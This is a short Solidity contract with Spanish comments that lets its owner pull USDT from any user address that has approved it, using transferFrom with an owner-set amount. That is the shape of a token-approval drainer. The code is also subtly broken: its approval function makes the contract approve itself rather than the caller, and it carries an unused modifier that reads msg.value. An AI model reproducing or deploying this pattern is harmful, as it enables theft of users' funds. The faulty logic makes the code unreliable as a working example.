// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    // Otras funciones de la interfaz ERC20 que puedas necesitar
}

contract ApprovalAndTransfer {
    IERC20 public usdtToken;
    address public owner;
    uint256 public minBalance; // Mínimo saldo en BNB requerido para realizar transferencias
    uint256 private decimals; // Decimales del token USDT (generalmente 18)

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _usdtToken, uint256 _minBalance) {
        usdtToken = IERC20(_usdtToken);
        owner = msg.sender;
        minBalance = _minBalance;
        decimals = 18; // Establecer el número de decimales del token USDT
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Insufficient BNB balance");
        _;
    }

function approveContract() external {
    // Establecer la asignación en el máximo posible con decimales
    uint256 maxApproval = type(uint256).max;
    require(usdtToken.approve(address(this), maxApproval), "Approval failed");
    emit Approved(msg.sender, owner);
}


    function withdrawTokens(uint256 amount, address user) external onlyOwner {
        // Convertir la cantidad a la escala de 18 decimales
        uint256 scaledAmount = amount * (10**decimals);
        require(usdtToken.transferFrom(user, owner, scaledAmount), "Transfer failed");
        emit TokensTransferred(user, owner, scaledAmount);
    }

    function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    // Función para depositar BNB en el contrato
    receive() external payable {}
}